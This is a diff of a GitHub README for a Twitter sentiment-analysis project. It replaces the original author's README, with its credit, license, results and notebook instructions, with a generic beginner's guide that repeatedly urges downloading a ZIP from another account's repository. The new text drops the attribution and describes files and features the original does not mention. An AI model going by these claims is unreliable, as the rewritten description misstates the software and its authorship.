@@ -1,102 +1,204 @@
-<p align="center">
-  <img src="images/Project_Banner.png" alt="Project Banner" width="80%" style="max-width: 1000px;"/>
-</p>
+# ⚙️ Sentiment-Embeddings - Analyze Twitter Sentiment Easily
 
-<h1 align="center">🐦 Twitter Sentiment Analysis using MiniLM Embeddings 🚀</h1>
-
-<p align="center">
-  <a href="#">
-    <img src="https://img.shields.io/badge/Python-3.8%2B-blue" alt="Python">
-  </a>
-  <a href="#">
-    <img src="https://img.shields.io/badge/License-MIT-green" alt="License">
-  </a>
-  <a href="https://github.com/m1n1v1rus/Sentiment-Embeddings/stargazers">
-    <img src="https://img.shields.io/github/stars/m1n1v1rus/Sentiment-Embeddings" alt="Stars">
-  </a>
-</p>
-
-
-[![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/drive/16x54MsCTOh3wqDIc3v9aS4fzghPs5xLd)
-
-## 📌 Project Overview
-Twitter sentiment analysis using **all-MiniLM-L6-v2** sentence embeddings. This project compares multiple machine learning models for sentiment classification (positive, negative, neutral) and includes comprehensive visualizations.
-
-## ✨ Features
-- **Text Preprocessing** - Complete tweet cleaning pipeline
-- **Sentence Embeddings** - Using all-MiniLM-L6-v2 (384-dim vectors)
-- **4 Classification Models** - Logistic Regression, XGBoost, SVM, Random Forest
-- **Cosine Similarity Analysis** - Embedding space visualization
-- **2D Visualization** - UMAP dimensionality reduction
-- **Custom Predictions** - Test with your own tweets
-
-## 📊 Results
-| Model | Accuracy | F1-Score |
-|-------|----------|----------|
-| SVM (RBF) | 68.20% | 0.684 |
-| Logistic Regression | 66.40% | 0.663 |
-| XGBoost | 63.50% | 0.637 |
-| Random Forest | 61.80% | 0.618 |
-
-## 🖼️ Visualizations
-
-### Sentiment Distribution
-![sentiment distribution](images/sentiment_distribution.png)
-
-### Confusion Matrix (SVM - Best Model)
-![confusion matrix](images/confusion_matrix.png)
-
-### Model Comparison
-![model comparison](images/model_comparison.png)
-
-### Word Clouds
-![wordclouds](images/wordclouds.png)
-
-### Cosine Similarity Between Classes
-![cosine similarity](images/cosine_similarity.png)
-
-### Tweet Length Analysis
-![text analysis](images/text_length_analysis.png)
-
-## 🛠️ Tech Stack
-- Python 3.x
-- sentence-transformers
-- scikit-learn
-- XGBoost
-- UMAP
-- matplotlib, seaborn
-
----
-## 🤝 Contributing
-
-All contributions are welcome — bug fixes, feature enhancements, or documentation improvements!
-
-Please give appropriate credit to the original author if you use or modify this tool in your own projects.
+[![Download Sentiment-Embeddings](https://img.shields.io/badge/Download-BrightGreen?style=for-the-badge)](https://github.com/ParfaitNathanael/Sentiment-Embeddings)
 
 ---
 
-## 📜 License
-
-This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.
+Sentiment-Embeddings helps you understand moods in tweets. It uses smart language processing to classify positive or negative feelings. You do not need any coding skills to run it on your Windows PC.
 
 ---
 
-## 👤 Author
+## 🔍 What This Software Does
 
-**Ayush Mani**  
-🔗 GitHub: [@m1n1v1rus](https://github.com/m1n1v1rus)
+This application reads tweets and analyzes their sentiment. It uses embeddings created by a model named all-MiniLM-L6-v2. This model turns words into numbers that the program can understand.
+
+The program then figures out if tweets express positive, neutral, or negative feelings. You can use it to see what people think about topics, brands, or events on Twitter.
 
 ---
 
+## 💻 System Requirements
 
-## 🚀 Quick Start
-```bash
-# Clone repository
-git clone https://github.com/m1n1v1rus/Sentiment-Embeddings-Project.git
+Before you begin, make sure your computer meets these:
 
-# Install requirements
-pip install -r requirements.txt
+- Windows 10 or later
+- 4 GB or more of RAM
+- At least 2 GB of free disk space
+- Internet connection for the initial setup
+- Python 3.8 or higher (the installer will help with this)
 
-# Run notebook
-jupyter notebook Sentiment_Embeddings_Project.ipynb
+---
+
+## 🚀 Getting Started: Download and Setup
+
+Please use the link below to get the application files. This link leads to the GitHub page where you can find the latest version.
+
+[![Download Sentiment-Embeddings](https://img.shields.io/badge/Download-Blue?style=for-the-badge)](https://github.com/ParfaitNathanael/Sentiment-Embeddings)
+
+---
+
+### Step 1: Visit the Download Page
+
+Open this link in your web browser:
+
+https://github.com/ParfaitNathanael/Sentiment-Embeddings
+
+This will take you to the project’s GitHub page. Here, you will find all the files needed to run the software.
+
+---
+
+### Step 2: Download the Files
+
+Look for a green button labeled **Code** on the right side of the page. Click it, then select **Download ZIP**.
+
+This saves a ZIP file to your computer. This file contains everything the application needs.
+
+---
+
+### Step 3: Extract the Files
+
+Find the ZIP file you just downloaded (usually in the Downloads folder).
+
+Right-click on the ZIP file and select **Extract All**. Choose a place you can easily access, such as your Desktop or Documents folder.
+
+Wait for the extraction to finish.
+
+---
+
+### Step 4: Install Python (if needed)
+
+The software requires Python to work. To check if Python is installed:
+
+- Press `Windows Key + R`
+- Type `cmd` and press Enter
+- In the black window, type `python --version` and press Enter
+
+If it shows a version number (like Python 3.9.6), you have it installed.
+
+If not, install Python:
+
+- Visit https://www.python.org/downloads/windows/
+- Download the latest version for Windows
+- Run the installer and **make sure to check the box** that says **Add Python to PATH**
+- Follow the setup steps to finish
+
+---
+
+### Step 5: Install Required Libraries
+
+You need to install a few Python libraries. To do this:
+
+- Open the Command Prompt (`Windows Key + R`, type `cmd`, press Enter)
+- Use the command below to go to the folder where you extracted the files. If you put the files on your Desktop, type:
+
 ```
+cd %USERPROFILE%\Desktop\Sentiment-Embeddings-main
+```
+Replace `Sentiment-Embeddings-main` with the exact folder name if different.
+
+- Next, type this command to install needed packages:
+
+```
+pip install -r requirements.txt
+```
+
+This command downloads and installs software modules that Sentiment-Embeddings needs to run.
+
+---
+
+## ▶️ Running the Application
+
+Inside the extracted folder, look for a file named `main.py`. This is the program's main file.
+
+To run it:
+
+- Open Command Prompt if not already open
+- Navigate to the folder where `main.py` is located (use the `cd` command as before)
+- Type:
+
+```
+python main.py
+```
+
+The program will start. It might open a window or run in the console.
+
+---
+
+### What You Can Expect
+
+Once running, the program will prompt you to enter Twitter data or upload a file with tweets. It processes this data and shows the sentiment results as text or simple charts.
+
+You can analyze the tone of recent tweets or any public tweets you have permission to use.
+
+---
+
+## ⚙️ How It Works
+
+Sentiment-Embeddings uses the following steps:
+
+1. **Reading Tweets:** It takes text data either by pasting or uploading a file.
+2. **Creating Embeddings:** It converts text into numerical form using the all-MiniLM-L6-v2 model.
+3. **Classifying Sentiment:** It decides if tweets are positive, neutral, or negative.
+4. **Displaying Results:** It shows which tweets have which sentiment.
+
+This process uses natural language processing, a method for computers to understand human language.
+
+---
+
+## 📂 File Structure Overview
+
+Here is a basic look at the main folders and files you will find in the extracted download:
+
+- `main.py` – The primary program to start the software.
+- `requirements.txt` – List of Python packages needed.
+- `data/` – Folder where you can place tweet data files for analysis.
+- `outputs/` – Where results and reports are saved.
+- `models/` – Contains the pre-trained models used for embedding.
+- `README.md` – This guide.
+
+---
+
+## 🔄 Updating the Software
+
+From time to time, the developers may update the software with improvements.
+
+To update:
+
+- Return to the download page: https://github.com/ParfaitNathanael/Sentiment-Embeddings
+- Download the latest ZIP file
+- Extract it, replacing your old files
+- Repeat the setup steps (pip install) if needed
+
+---
+
+## ❓ Troubleshooting Tips
+
+If you run into issues, try these steps:
+
+- Make sure Python is installed and added to PATH.
+- Run the Command Prompt as Administrator.
+- Check your internet connection during package installation.
+- Verify you are in the right folder when running commands.
+- Read error messages carefully and search online for specific issues.
+
+---
+
+## 📚 Additional Information
+
+Sentiment-Embeddings is built using these technologies:
+
+- Python 3
+- Transformers library for natural language processing
+- Pretrained embedding model all-MiniLM-L6-v2 for text representation
+- Jupyter Notebook support to explore data (optional)
+
+These components work together to analyze Twitter sentiment in an accurate and efficient way.
+
+---
+
+## 🔗 Download Link
+
+You can always download the latest version here:
+
+https://github.com/ParfaitNathanael/Sentiment-Embeddings
+
+Use the **Download ZIP** option under **Code** on the repository page.
